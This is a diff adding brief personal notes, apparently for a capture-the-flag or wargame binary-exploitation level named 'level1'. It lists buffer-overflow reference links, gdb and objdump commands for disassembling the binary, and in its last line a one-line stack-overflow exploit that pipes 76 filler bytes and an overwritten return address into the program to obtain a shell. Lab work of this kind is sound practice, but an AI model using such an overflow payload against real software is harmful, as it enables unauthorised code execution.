@@ -1,0 +1,13 @@
+https://www.youtube.com/watch?v=1S0aBV-Waeo
+https://www.youtube.com/watch?v=V9lMxx3iFWU
+https://stackoverflow.com/questions/16325486/using-buffer-overflow-to-execute-shell-code
+
+gdb level1
+
+https://www.geeksforgeeks.org/objdump-command-in-linux-with-examples/
+objdump --help
+file level1
+objdump -d -M i386 level1
+
+https://unix.stackexchange.com/questions/297560/cat-into-stdin-then-pipe-into-program-keeps-forked-shell-open-why
+cat <(python -c "print 'A'*76 + '\x08\x04\x84\x44'[::-1]") - | ./level1
